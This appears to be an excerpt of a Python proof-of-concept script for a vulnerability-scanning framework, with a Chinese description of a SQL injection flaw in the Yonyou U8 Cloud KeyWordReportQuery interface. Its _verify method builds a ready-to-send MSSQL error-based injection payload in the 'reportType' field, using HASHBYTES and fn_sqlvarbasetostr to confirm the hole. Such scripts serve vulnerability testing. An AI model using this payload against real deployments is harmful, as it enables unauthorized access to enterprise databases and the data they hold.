...
LastEditTime: 2024-02-06 14:31:38
FilePath: \用友\用友U8C-KeyWordReportQuery-SQL注入y.py
Description: 
...
class POC(POCBase):
    ...
    desc = '''
        用友U8 cloud是用友推出的企业上云数字化平台，该产品/service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery接口处存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。
    '''
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        ...
        try:
            ...
            hash = md5.hexdigest()
            data = {"reportType":"1' AND 1 IN (SELECT sys.fn_sqlvarbasetostr(HASHBYTES('MD5','"+str(random_num)+"')))--","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
